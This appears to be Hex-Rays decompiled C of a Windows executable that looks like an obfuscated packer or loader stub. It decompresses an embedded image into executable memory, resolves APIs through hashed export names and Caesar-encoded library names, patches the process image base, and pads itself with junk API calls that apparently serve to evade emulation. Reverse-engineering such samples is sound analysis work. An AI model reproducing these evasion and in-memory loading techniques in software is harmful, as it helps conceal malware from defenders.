/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(_BYTE *a1);
int __cdecl sub_401480(int a1, int a2);
// int __usercall sub_4015C0@<eax>(_DWORD *a1@<edi>);
LCID sub_401640();
HMODULE sub_401980();
// char __usercall sub_401D70@<al>(_BYTE *a1@<eax>, char *a2@<ecx>, int a3@<ebx>);
int (*sub_401DE0())(void);
// int __usercall start@<eax>(int a1@<eax>);
int sub_401FC0();
// HRESULT __stdcall VarCat(LPVARIANT pvarLeft, LPVARIANT pvarRight, LPVARIANT pvarResult);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// DWORD __stdcall GetLastError();
// LCID __stdcall GetThreadLocale();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);

//-------------------------------------------------------------------------
// Data declarations

int dword_403038 = 4096; // weak
int dword_405378 = 0; // weak
int dword_40537C = 0; // weak
int dword_405380 = 0; // weak
int dword_405384 = 0; // weak
char byte_405388 = '7'; // weak
_UNKNOWN unk_405389; // weak
char aCrvgkzsNvv[12] = "crvgkzs$nvv"; // weak


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(_BYTE *a1)
{
  int v1; // eax
  unsigned __int8 *v2; // ecx
  unsigned __int8 *v3; // ebp
  unsigned int v4; // edx
  int v5; // eax
  bool v6; // zf
  int v7; // eax
  unsigned int v8; // edx
  int v9; // eax
  int v10; // edi
  int v11; // eax
  unsigned int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // eax
  int v16; // eax
  unsigned __int8 *v17; // edx
  int v18; // eax
  unsigned int v19; // esi
  int v20; // eax
  unsigned __int8 *v22; // [esp+14h] [ebp-8Ch] BYREF
  unsigned __int8 *v23; // [esp+18h] [ebp-88h]
  unsigned int v24; // [esp+1Ch] [ebp-84h]
  int v25; // [esp+20h] [ebp-80h]
  int v26; // [esp+24h] [ebp-7Ch]
  int v27; // [esp+28h] [ebp-78h]
  unsigned int v28; // [esp+2Ch] [ebp-74h]

  v1 = 0;
  *a1 = byte_405388;
  v2 = a1 + 1;
  v3 = (unsigned __int8 *)&unk_405389;
  v26 = 0;
  v27 = 0;
  v23 = a1 + 1;
  v22 = (unsigned __int8 *)&unk_405389;
  v4 = v24;
  while ( 1 )
  {
    v25 = v1 - 1;
    if ( !v1 )
    {
      v4 = *v3++;
      v22 = v3;
      v25 = 7;
    }
    v5 = (v4 >> 7) & 1;
    v4 *= 2;
    if ( !v5 )
    {
      *v2++ = *v3;
      v22 = ++v3;
      v26 = 0;
LABEL_45:
      v23 = v2;
      goto LABEL_46;
    }
    v6 = v25-- == 0;
    if ( v6 )
    {
      v4 = *v3++;
      v22 = v3;
      v25 = 7;
    }
    v7 = (v4 >> 7) & 1;
    v8 = 2 * v4;
    v24 = v8;
    if ( !v7 )
    {
      v15 = sub_4015C0(&v22);
      if ( v26 )
      {
        v18 = v15 - 2;
      }
      else
      {
        if ( v15 == 2 )
        {
          v16 = sub_4015C0(&v22);
          v2 = v23;
          if ( !v16 )
            goto LABEL_43;
          do
          {
            v17 = &v2[-v28];
            ++v2;
            --v16;
            *(v2 - 1) = *v17;
          }
          while ( v16 );
          v4 = v24;
          v3 = v22;
          v23 = v2;
          v26 = 1;
          goto LABEL_46;
        }
        v18 = v15 - 3;
      }
      v19 = *v22++ + (v18 << 8);
      v20 = sub_4015C0(&v22);
      if ( v19 >= 0x7D00 )
        ++v20;
      if ( v19 >= 0x500 )
        ++v20;
      if ( v19 < 0x80 )
        v20 += 2;
      v2 = v23;
      if ( v20 )
      {
        do
        {
          *v2 = v2[-v19];
          ++v2;
          --v20;
        }
        while ( v20 );
        v23 = v2;
      }
      v28 = v19;
LABEL_43:
      v4 = v24;
      v3 = v22;
      v26 = 1;
      goto LABEL_46;
    }
    v6 = v25-- == 0;
    if ( v6 )
    {
      v8 = *v3++;
      v22 = v3;
      v25 = 7;
    }
    v9 = (v8 >> 7) & 1;
    v4 = 2 * v8;
    if ( v9 )
    {
      v10 = 0;
      v26 = 4;
      do
      {
        v6 = v25-- == 0;
        if ( v6 )
        {
          v4 = *v3++;
          v25 = 7;
        }
        v11 = (v4 >> 7) & 1;
        v4 *= 2;
        v6 = v26-- == 1;
        v10 = v11 + 2 * v10;
      }
      while ( !v6 );
      v22 = v3;
      if ( v10 )
        *v2 = v2[-v10];
      else
        *v2 = 0;
      ++v2;
      v26 = 0;
      goto LABEL_45;
    }
    v12 = *v3++;
    v13 = (v12 & 1) + 2;
    v14 = v12 >> 1;
    v22 = v3;
    if ( !v14 )
    {
      v27 = 1;
LABEL_25:
      v28 = v14;
      v26 = 1;
      goto LABEL_46;
    }
    if ( !v13 )
      goto LABEL_25;
    do
    {
      *v2 = v2[-v14];
      ++v2;
      --v13;
    }
    while ( v13 );
    v23 = v2;
    v28 = v14;
    v26 = 1;
LABEL_46:
    if ( v27 )
      return v2 - a1;
    v1 = v25;
  }
}
// 405388: using guessed type char byte_405388;

//----- (00401480) --------------------------------------------------------
int __cdecl sub_401480(int a1, int a2)
{
  int v2; // edi
  int v3; // ebx
  _DWORD *v4; // edi
  int v5; // ebx
  int v6; // ecx
  char v7; // al
  char *v8; // ecx
  int v9; // edx
  int v10; // eax
  int v11; // ebx
  bool v12; // zf
  int v14; // [esp+10h] [ebp-13Ch]
  int v15; // [esp+14h] [ebp-138h]
  int v16; // [esp+18h] [ebp-134h]
  int v17; // [esp+1Ch] [ebp-130h]
  int v18; // [esp+20h] [ebp-12Ch]

  v15 = 0;
  v2 = *(_DWORD *)(a1 + *(_DWORD *)(a1 + 60) + 120);
  v3 = *(_DWORD *)(v2 + a1 + 36);
  v4 = (_DWORD *)(a1 + v2);
  v5 = a1 + v3;
  v16 = v5;
  GetModuleHandleA(0);
  v18 = a1 + v4[7];
  v14 = 0;
  if ( (int)v4[6] > 0 )
  {
    while ( 1 )
    {
      v6 = *(_DWORD *)(a1 + v4[8] + 4 * v14);
      v7 = *(_BYTE *)(v6 + a1);
      v8 = (char *)(a1 + v6);
      v9 = 0;
      if ( v7 )
      {
        do
        {
          ++v8;
          v9 = v7 ^ __ROL4__(v9, 3);
          v7 = *v8;
        }
        while ( *v8 );
      }
      v10 = 124;
      v11 = 15;
      do
      {
        v12 = v10 == -5;
        v10 += 5;
        v17 = v10;
        if ( !v12 )
        {
          v10 = 6;
          v17 = 6;
        }
        v8 -= v17;
        --v11;
      }
      while ( v11 );
      if ( v9 == a2 )
        break;
      if ( ++v14 >= v4[6] )
        goto LABEL_12;
    }
    v15 = 1;
LABEL_12:
    v5 = v16;
  }
  sub_401980();
  if ( !v15 )
    return 0;
  GetLastError();
  return a1 + *(_DWORD *)(v18 + 4 * *(unsigned __int16 *)(v5 + 2 * v14));
}

//----- (004015C0) --------------------------------------------------------
int __usercall sub_4015C0@<eax>(_DWORD *a1@<edi>)
{
  int v1; // ebp
  int v2; // ecx
  unsigned int v3; // eax
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  unsigned int v7; // eax
  int v8; // edx
  int result; // eax

  v1 = 1;
  v2 = a1[3];
  v3 = a1[2];
  do
  {
    v4 = v2;
    v5 = v2 - 1;
    if ( !v4 )
    {
      v3 = *(unsigned __int8 *)(*a1)++;
      v5 = 7;
    }
    v1 = ((v3 >> 7) & 1) + 2 * v1;
    v6 = v5;
    v7 = 2 * v3;
    v2 = v5 - 1;
    if ( !v6 )
    {
      v7 = *(unsigned __int8 *)(*a1)++;
      v2 = 7;
    }
    v8 = (v7 >> 7) & 1;
    v3 = 2 * v7;
  }
  while ( v8 );
  a1[2] = v3;
  result = v1;
  a1[3] = v2;
  return result;
}

//----- (00401640) --------------------------------------------------------
LCID sub_401640()
{
  int v0; // ecx
  int v1; // edx
  int v2; // edi
  int v3; // eax
  __int16 v4; // si
  HMODULE v5; // eax
  void (__stdcall *v6)(int, int, int, char *); // eax
  int v7; // ebx
  unsigned int v8; // eax
  int v9; // ecx
  int v10; // ecx
  int v11; // edx
  int v12; // eax
  int v13; // ebp
  int v14; // esi
  _DWORD *v15; // esi
  int i; // edx
  _WORD *v17; // ecx
  unsigned int v18; // edi
  int *j; // ebp
  HMODULE v20; // ecx
  int v21; // edi
  unsigned __int16 *v22; // edi
  FARPROC *v23; // esi
  int v24; // eax
  const CHAR *v25; // eax
  unsigned int v26; // eax
  _DWORD *v27; // esi
  LCID result; // eax
  int v29; // ecx
  _BYTE v30[20]; // [esp+0h] [ebp-2F0h] BYREF
  struct _PEB *v31; // [esp+14h] [ebp-2DCh]
  char v32[4]; // [esp+18h] [ebp-2D8h] BYREF
  CHAR LibFileName[4]; // [esp+1Ch] [ebp-2D4h] BYREF
  char v34; // [esp+28h] [ebp-2C8h]
  int v35; // [esp+2Ch] [ebp-2C4h]
  HMODULE v36; // [esp+30h] [ebp-2C0h]
  _DWORD v37[6]; // [esp+34h] [ebp-2BCh] BYREF
  int v38; // [esp+4Ch] [ebp-2A4h]
  int v39; // [esp+7Bh] [ebp-275h]
  int v40; // [esp+FBh] [ebp-1F5h]
  int v41; // [esp+18Ch] [ebp-164h]
  _WORD v42[3]; // [esp+1B9h] [ebp-137h]
  int v43; // [esp+1C5h] [ebp-12Bh]
  int v44; // [esp+261h] [ebp-8Fh]
  _BYTE v45[7]; // [esp+273h] [ebp-7Dh]

  v0 = 877;
  v1 = 6;
  do
  {
    v0 *= 16;
    v35 = v0;
    if ( !v0 )
    {
      v0 = 9;
      v35 = 9;
    }
    --v1;
  }
  while ( v1 );
  v2 = dword_40537C;
  v38 += v37[4] | CloseHandle(0);
  sub_401DE0();
  GetThreadLocale();
  v3 = *(_DWORD *)(v2 + 60);
  v4 = *(_WORD *)(v3 + v2 + 22);
  v36 = *(HMODULE *)(v2 + v3 + 192);
  v34 = 0;
  strcpy((char *)v37, "ztgcta<=!saa");
  sub_401D70(LibFileName, (char *)v37, 11);
  v5 = LoadLibraryA(LibFileName);
  v40 ^= (unsigned int)v30;
  v6 = (void (__stdcall *)(int, int, int, char *))sub_401480((int)v5, -973131962);
  v6(v2, 335872, 64, v32);
  v7 = (int)v30;
  v39 += GetLastError();
  sub_401000((_BYTE *)v2);
  v8 = v2;
  v9 = 83967;
  do
  {
    *(_DWORD *)v8 += 23574;
    v8 += 4;
    --v9;
  }
  while ( v9 );
  v10 = 107;
  v11 = 11;
  do
  {
    v10 -= 10;
    v35 = v10;
    if ( !v10 )
    {
      v10 = 6;
      v35 = 6;
    }
    v8 ^= v35;
    --v11;
  }
  while ( v11 );
  GetModuleHandleA(0);
  v12 = (int)v36;
  v13 = v2 + *(_DWORD *)(v2 + 60);
  *(_WORD *)(v13 + 22) = v4;
  v14 = *(_DWORD *)(v13 + 160);
  v35 = v13;
  *(_DWORD *)(v13 + 192) = v12;
  if ( v14 )
  {
    v15 = (_DWORD *)(dword_40537C + v14);
    v7 = (int)&v30[*(_DWORD *)&v42[1]];
    v41 &= GetLastError();
    for ( i = dword_40537C - *(_DWORD *)(v13 + 52); *v15; v15 = (_DWORD *)((char *)v15 + v15[1]) )
    {
      v17 = v15 + 2;
      if ( (unsigned int)(v15[1] - 8) >> 1 )
      {
        v18 = (unsigned int)(v15[1] - 8) >> 1;
        do
        {
          v7 = *v17 & 0xF000;
          if ( v7 == 12288 )
          {
            v7 = dword_40537C;
            *(_DWORD *)(dword_40537C + *v15 + (*v17 & 0xFFF)) += i;
          }
          ++v17;
          --v18;
        }
        while ( v18 );
      }
    }
  }
  if ( *(_DWORD *)(v13 + 128) )
  {
    v43 += (int)GetModuleHandleA(0);
    for ( j = (int *)(dword_40537C + *(_DWORD *)(v13 + 128)); j[4]; j += 5 )
    {
      v20 = LoadLibraryA((LPCSTR)(dword_40537C + j[3]));
      v36 = v20;
      if ( v20 )
      {
        v21 = *j;
        if ( !*j )
          v21 = j[4];
        v22 = (unsigned __int16 *)(dword_40537C + v21);
        v23 = (FARPROC *)(dword_40537C + j[4]);
        v24 = *(_DWORD *)v22;
        if ( *(_DWORD *)v22 )
        {
          while ( 1 )
          {
            if ( v24 >= 0 )
            {
              v25 = (const CHAR *)(v24 + dword_40537C + 2);
            }
            else
            {
              v44 += v24;
              *(_DWORD *)&v45[3] -= v24;
              v7 ^= *(_DWORD *)v45;
              v25 = (const CHAR *)*v22;
            }
            v22 += 2;
            *v23 = GetProcAddress(v20, v25);
            v24 = *(_DWORD *)v22;
            ++v23;
            if ( !*(_DWORD *)v22 )
              break;
            v20 = v36;
          }
        }
      }
    }
    v13 = v35;
  }
  dword_405384 = dword_40537C + *(_DWORD *)(v13 + 40);
  v31 = NtCurrentPeb();
  v26 = (unsigned int)v31->ImageBaseAddress;
  v27 = *(_DWORD **)(v26 + 12);
  do
  {
    v27 = (_DWORD *)*v27;
    v26 &= *(_DWORD *)((char *)v37 + 1);
    v7 += v37[0];
  }
  while ( v27[6] != dword_40537C );
  result = GetThreadLocale();
  v27[7] = dword_405384;
  v36 = 0;
  v29 = 22;
  do
  {
    result -= (unsigned int)v36;
    --v29;
  }
  while ( v29 );
  return result;
}
// 40537C: using guessed type int dword_40537C;
// 405384: using guessed type int dword_405384;

//----- (00401980) --------------------------------------------------------
HMODULE sub_401980()
{
  HMODULE v0; // eax
  unsigned int v1; // ecx
  int v2; // edx
  unsigned int v3; // ecx
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  int v7; // ecx
  unsigned int v8; // ecx
  int v9; // eax
  HMODULE v10; // eax
  int v11; // ecx
  int v12; // ecx
  unsigned int v13; // ecx
  int v14; // edi
  unsigned int v15; // ecx
  int v16; // edi
  int v17; // edx
  unsigned int v18; // eax
  int v19; // edx
  int v20; // ecx
  int v21; // edx
  unsigned int v22; // eax
  int v23; // ecx
  int v24; // edx
  HMODULE v25; // eax
  int v26; // edx
  int v27; // eax
  int v28; // ecx
  int v29; // edx
  DWORD v30; // eax
  int v31; // ecx
  int v32; // edx
  int v33; // ecx
  bool v34; // zf
  LCID v35; // eax
  int v36; // ecx
  LCID v37; // eax
  int v38; // ecx
  int v39; // edx
  int v40; // ecx
  int v42; // [esp+768h] [ebp-8h]
  int v43; // [esp+768h] [ebp-8h]
  int v44; // [esp+768h] [ebp-8h]
  int v45; // [esp+768h] [ebp-8h]

  CloseHandle(0);
  GetLastError();
  v0 = GetModuleHandleA(0);
  v1 = 788;
  v2 = 9;
  do
  {
    v1 >>= 7;
    v42 = v1;
    if ( !v1 )
    {
      v1 = 8;
      v42 = 8;
    }
    v0 = (HMODULE)((char *)v0 + v42);
    --v2;
  }
  while ( v2 );
  GetModuleHandleA(0);
  GetLastError();
  GetLastError();
  v3 = 186;
  v4 = 10;
  do
  {
    v3 >>= 1;
    if ( !v3 )
      v3 = 0;
    --v4;
  }
  while ( v4 );
  CloseHandle(0);
  v6 = 48;
  do
  {
    v5 |= 0x1F5u;
    --v6;
  }
  while ( v6 );
  GetModuleHandleA(0);
  GetModuleHandleA(0);
  v8 = (unsigned int)GetLastError ^ v7;
  v9 = 2;
  do
  {
    v8 ^= 5u;
    --v9;
  }
  while ( v9 );
  GetLastError();
  GetThreadLocale();
  v10 = GetModuleHandleA(0);
  v11 = 8;
  do
  {
    v10 = (HMODULE)((unsigned int)v10 | 0xA);
    --v11;
  }
  while ( v11 );
  GetThreadLocale();
  GetLastError();
  CloseHandle(0);
  v12 = 20;
  do
    --v12;
  while ( v12 );
  GetModuleHandleA(0);
  v13 = 783;
  v14 = 9;
  do
  {
    v13 /= 7u;
    if ( !v13 )
      v13 = 2;
    --v14;
  }
  while ( v14 );
  GetThreadLocale();
  CloseHandle(0);
  CloseHandle(0);
  CloseHandle(0);
  v15 = 590;
  v16 = 22;
  do
  {
    v15 /= 7u;
    if ( v15 )
      v15 = 5;
    --v16;
  }
  while ( v16 );
  GetModuleHandleA(0);
  v17 = 14;
  do
    --v17;
  while ( v17 );
  GetThreadLocale();
  v18 = 900;
  v19 = 15;
  do
  {
    v18 >>= 3;
    if ( !v18 )
      v18 = 6;
    --v19;
  }
  while ( v19 );
  CloseHandle(0);
  GetModuleHandleA(0);
  v20 = 618;
  v21 = 13;
  do
  {
    v20 += 8;
    if ( !v20 )
      v20 = 1;
    --v21;
  }
  while ( v21 );
  CloseHandle(0);
  v22 = (unsigned int)GetModuleHandleA | GetThreadLocale();
  v23 = 352;
  v24 = 9;
  do
  {
    v23 -= 6;
    v43 = v23;
    if ( !v23 )
    {
      v23 = 1;
      v43 = 1;
    }
    v22 |= v43;
    --v24;
  }
  while ( v24 );
  GetModuleHandleA(0);
  v25 = GetModuleHandleA(0);
  v27 = v26 & (unsigned int)v25;
  v28 = 570;
  v29 = 2;
  do
  {
    v28 *= 8;
    v27 += v28;
    --v29;
  }
  while ( v29 );
  v30 = GetLastError();
  v31 = 360;
  v32 = 15;
  do
  {
    v33 = 5 * v31;
    v34 = 2 * v33 == 0;
    v31 = 2 * v33;
    v44 = v31;
    if ( v34 )
    {
      v31 = 10;
      v44 = 10;
    }
    v30 -= v44;
    --v32;
  }
  while ( v32 );
  v35 = GetThreadLocale();
  v36 = 9;
  do
  {
    v35 -= 6;
    --v36;
  }
  while ( v36 );
  GetModuleHandleA(0);
  GetLastError();
  CloseHandle(0);
  CloseHandle(0);
  v37 = GetThreadLocale();
  v38 = 516;
  v39 = 29;
  do
  {
    v40 = 4 * v38;
    v34 = 2 * v40 == 0;
    v38 = 2 * v40;
    v45 = v38;
    if ( v34 )
    {
      v38 = 8;
      v45 = 8;
    }
    v37 |= v45;
    --v39;
  }
  while ( v39 );
  return GetModuleHandleA(0);
}
// 401A16: conditional instruction was optimized away because of 'eax.4==1F5'
// 401A20: variable 'v5' is possibly undefined
// 401A41: variable 'v7' is possibly undefined
// 401C79: variable 'v26' is possibly undefined

//----- (00401D70) --------------------------------------------------------
char __usercall sub_401D70@<al>(_BYTE *a1@<eax>, char *a2@<ecx>, int a3@<ebx>)
{
  char *v3; // esi
  char result; // al
  char v6; // al

  v3 = a2;
  for ( result = *a2; *v3; ++a1 )
  {
    if ( (unsigned __int8)(result - 65) > 0x19u )
    {
      if ( (unsigned __int8)(result - 97) > 0x19u )
        v6 = (26 - a3) ^ result;
      else
        v6 = (result + a3 - 97) % 26 + 97;
    }
    else
    {
      v6 = (result + a3 - 65) % 26 + 65;
    }
    ++v3;
    *a1 = v6;
    result = *v3;
  }
  return result;
}

//----- (00401DE0) --------------------------------------------------------
int (*sub_401DE0())(void)
{
  HMODULE v0; // eax
  int v1; // edx
  HMODULE v2; // ebx
  FARPROC v3; // edi
  FARPROC v4; // esi
  void (*v5)(void); // eax
  int (*result)(void); // eax
  int v7; // [esp+0h] [ebp-2DCh] BYREF
  int v8; // [esp+107h] [ebp-1D5h]
  int v9; // [esp+10Fh] [ebp-1CDh]
  int v10; // [esp+170h] [ebp-16Ch]
  int v11; // [esp+1ECh] [ebp-F0h]
  int v12; // [esp+1F1h] [ebp-EBh]
  int v13; // [esp+251h] [ebp-8Bh]
  char v14[16]; // [esp+288h] [ebp-54h] BYREF
  VARIANT pvarLeft; // [esp+298h] [ebp-44h] BYREF
  VARIANT pvarRight; // [esp+2A8h] [ebp-34h] BYREF
  VARIANT pvarResult; // [esp+2B8h] [ebp-24h] BYREF
  CHAR LibFileName[16]; // [esp+2C8h] [ebp-14h] BYREF
  unsigned int v19; // [esp+2D8h] [ebp-4h]

  v0 = GetModuleHandleA(0);
  v9 &= (unsigned int)v0;
  v8 -= (int)v0;
  v19 = v1 & (unsigned int)v0;
  GetThreadLocale();
  GetLastError();
  LibFileName[12] = 0;
  strcpy(v14, "vslhba45)kss");
  sub_401D70(LibFileName, v14, 19);
  v2 = LoadLibraryA(LibFileName);
  v12 += GetLastError() - v11;
  v3 = GetProcAddress(v2, (LPCSTR)0xCA);
  v10 = CloseHandle(0) - (_DWORD)&v7;
  CloseHandle(0);
  if ( !((int (__stdcall *)(_DWORD))v3)(0) )
    MEMORY[0]();
  GetModuleHandleA(0);
  v4 = GetProcAddress(v2, (LPCSTR)0xA7);
  v13 |= GetLastError();
  GetThreadLocale();
  pvarLeft.vt = 11;
  pvarRight.vt = 11;
  v5 = (void (*)(void))VarCat(&pvarLeft, &pvarRight, &pvarResult);
  if ( v5 )
    v5();
  result = (int (*)(void))((int (__stdcall *)(VARIANT *, VARIANT *, VARIANT *))v4)(&pvarLeft, &pvarRight, &pvarResult);
  if ( result )
    result = (int (*)(void))result();
  if ( pvarResult.vt != 11 )
    result = (int (*)(void))result();
  return result;
}
// 401E07: variable 'v1' is possibly undefined

//----- (00401F50) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall start@<eax>(int a1@<eax>)
{
  unsigned int v1; // ecx
  int v2; // edx
  int v3; // eax
  int v4; // edx
  int v6; // [esp+4h] [ebp-4h]
  int v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h]

  v1 = 485;
  v2 = 16;
  do
  {
    v1 >>= 7;
    v6 = v1;
    if ( !v1 )
    {
      v1 = 4;
      v6 = 4;
    }
    a1 ^= v6;
    --v2;
  }
  while ( v2 );
  v3 = 400;
  v4 = 3;
  do
  {
    v3 -= 4;
    v7 = v3;
    if ( v3 )
    {
      v3 = 0;
      v7 = 0;
    }
    v1 += v7;
    --v4;
  }
  while ( v4 );
  if ( sub_401FC0() )
    sub_401640();
  savedregs = 0;
  return ((int (*)(void))dword_405384)();
}
// 401FA9: positive sp value 4 has been found
// 405384: invalid function type has been ignored
// 405384: using guessed type int dword_405384;

//----- (00401FC0) --------------------------------------------------------
int sub_401FC0()
{
  void (*v0)(void); // eax
  int v2; // ecx
  SIZE_T v3; // esi
  int *v4; // ebx
  _BYTE *v5; // eax
  unsigned int v6; // ecx
  int v7; // edi
  char *v8; // esi
  int v9; // edx
  unsigned int v10; // edx
  HMODULE v11; // eax
  int v12; // [esp+A0h] [ebp-44h]
  VARIANT pvarResult; // [esp+A4h] [ebp-40h] BYREF
  int v14; // [esp+B4h] [ebp-30h]
  VARIANT pvarRight; // [esp+B8h] [ebp-2Ch] BYREF
  VARIANT pvarLeft; // [esp+C8h] [ebp-1Ch] BYREF
  CHAR LibFileName[12]; // [esp+D8h] [ebp-Ch] BYREF

  pvarLeft.vt = 11;
  pvarRight.vt = 11;
  v0 = (void (*)(void))VarCat(&pvarLeft, &pvarRight, &pvarResult);
  if ( v0 )
    v0();
  if ( dword_405378 )
    return 1;
  dword_405378 = 1;
  sub_401DE0();
  dword_40537C = (int)sub_401FC0;
  LOWORD(dword_40537C) = 0;
  v2 = *(_DWORD *)(dword_40537C + 60);
  v3 = *(_DWORD *)(v2 + dword_40537C + 80);
  v12 = dword_40537C + v2;
  v4 = &dword_403038;
  v5 = VirtualAlloc(0, v3, 0x1000u, 0x40u);
  dword_405380 = (int)v5;
  if ( v3 )
  {
    v6 = (unsigned int)v5;
    v7 = dword_40537C - (_DWORD)v5;
    do
    {
      *(_BYTE *)v6 = *(_BYTE *)(v7 + v6);
      ++v6;
      --v3;
    }
    while ( v3 );
  }
  v8 = &v5[-dword_40537C];
  if ( dword_403038 )
  {
    do
    {
      v14 = 230;
      v9 = 23;
      do
      {
        v6 |= v14;
        --v9;
      }
      while ( v9 );
      v6 = (unsigned int)(v4 + 2);
      if ( (unsigned int)(v4[1] - 8) >> 1 )
      {
        v10 = (unsigned int)(v4[1] - 8) >> 1;
        do
        {
          if ( (*(_WORD *)v6 & 0xF000) == 12288 )
            *(_DWORD *)(*v4 + dword_405380 + (*(_WORD *)v6 & 0xFFF)) += v8;
          v6 += 2;
          --v10;
        }
        while ( v10 );
      }
      v4 = (int *)((char *)v4 + v4[1]);
    }
    while ( *v4 );
  }
  CloseHandle(0);
  LibFileName[11] = 0;
  sub_401D70(LibFileName, aCrvgkzsNvv, 16);
  v11 = LoadLibraryA(LibFileName);
  if ( !sub_401480((int)v11, 35392525) )
    dword_405384 = dword_405380 + *(_DWORD *)(v12 + 40);
  return 0;
}
// 402097: variable 'v6' is possibly undefined
// 403038: using guessed type int dword_403038;
// 405378: using guessed type int dword_405378;
// 40537C: using guessed type int dword_40537C;
// 405380: using guessed type int dword_405380;
// 405384: using guessed type int dword_405384;

// nfuncs=10 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled
